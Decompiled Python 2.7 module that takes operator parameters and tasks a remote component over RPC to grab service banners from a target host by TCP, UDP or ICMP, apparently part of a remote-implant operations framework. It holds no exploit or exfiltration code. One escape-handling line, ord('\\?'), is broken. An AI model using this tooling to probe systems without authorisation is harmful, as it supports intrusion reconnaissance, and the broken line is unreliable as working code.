# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Banner_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.banner', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.banner.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.banner.Params()
    tgtParams.targetAddr = lpParams['targetAddress']
    tgtParams.broadcast = lpParams['broadcast']
    tgtParams.wait = lpParams['wait']
    tgtParams.dstPort = lpParams['dstPort']
    tgtParams.srcPort = lpParams['srcPort']
    if lpParams['protocol'] == 1:
        protocol = 'TCP'
        tgtParams.socketType = mca.network.cmd.banner.SOCKET_TYPE_TCP
    elif lpParams['protocol'] == 2:
        protocol = 'UDP'
        tgtParams.socketType = mca.network.cmd.banner.SOCKET_TYPE_UDP
    elif lpParams['protocol'] == 3:
        protocol = 'ICMP'
        tgtParams.socketType = mca.network.cmd.banner.SOCKET_TYPE_ICMP
    else:
        mcl.tasking.OutputError('Invalid protocol type (%u)' % lpParams['protocol'])
        return False
    if tgtParams.dstPort == 0 and tgtParams.socketType != mca.network.cmd.banner.SOCKET_TYPE_ICMP:
        mcl.tasking.OutputError('A port must be specified for this type of connection')
        return False
    else:
        if lpParams['...'] != None:
            if not _bufferScrubber(lpParams['...'], tgtParams.data):
                mcl.tasking.OutputError('Invalid send buffer')
                return False
        taskXml = mcl.tasking.Tasking()
        taskXml.SetTargetRemote('%s' % tgtParams.targetAddr)
        taskXml.SetType(protocol)
        if tgtParams.dstPort != 0:
            taskXml.AddSearchMask('%u' % tgtParams.dstPort)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        rpc = mca.network.cmd.banner.tasking.RPC_INFO_BANNER
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.banner.errorStrings)
            return False
        return True


def _bufferScrubber(input, data):
    i = 0
    while i < len(input):
        try:
            if input[i] != '\\':
                charToAdd = ord(input[i])
            else:
                if input[i + 1] == 'a':
                    charToAdd = ord('\x07')
                elif input[i + 1] == 'b':
                    charToAdd = ord('\x08')
                elif input[i + 1] == 'f':
                    charToAdd = ord('\x0c')
                elif input[i + 1] == 'n':
                    charToAdd = ord('\n')
                elif input[i + 1] == 'r':
                    charToAdd = ord('\r')
                elif input[i + 1] == 't':
                    charToAdd = ord('\t')
                elif input[i + 1] == 'v':
                    charToAdd = ord('\x0b')
                elif input[i + 1] == '?':
                    charToAdd = ord('\\?')
                elif input[i + 1] == "'":
                    charToAdd = ord("'")
                elif input[i + 1] == '"':
                    charToAdd = ord('"')
                elif input[i + 1] == '\\':
                    charToAdd = ord('\\')
                elif input[i + 1] == '0' or input[i + 1] == '1' or input[i + 1] == '2' or input[i + 1] == '3':
                    sum = 0
                    j = i + 1
                    while j <= i + 3:
                        if j >= len(input):
                            return False
                        charval = ord(input[j]) - ord('0')
                        if charval >= 0 and charval <= 7:
                            sum = 8 * sum + charval
                        else:
                            return False
                        j = j + 1

                    charToAdd = sum
                    i = i + 2
                elif input[i + 1] == 'X' or input[i + 1] == 'x':
                    sum = 0
                    i = i + 2
                    j = i
                    while j <= i + 1:
                        if j >= len(input):
                            return False
                        charval = ord(input[j].upper()) - ord('0')
                        if charval >= 0 and charval <= 9:
                            sum = 16 * sum + charval
                        elif charval + ord('0') >= ord('A') and charval + ord('0') <= ord('F'):
                            sum = 16 * sum + charval - 7
                        else:
                            return False
                        charToAdd = sum
                        j = j + 1

                else:
                    return False
                i = i + 1
            data.append(charToAdd)
        finally:
            i = i + 1

    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)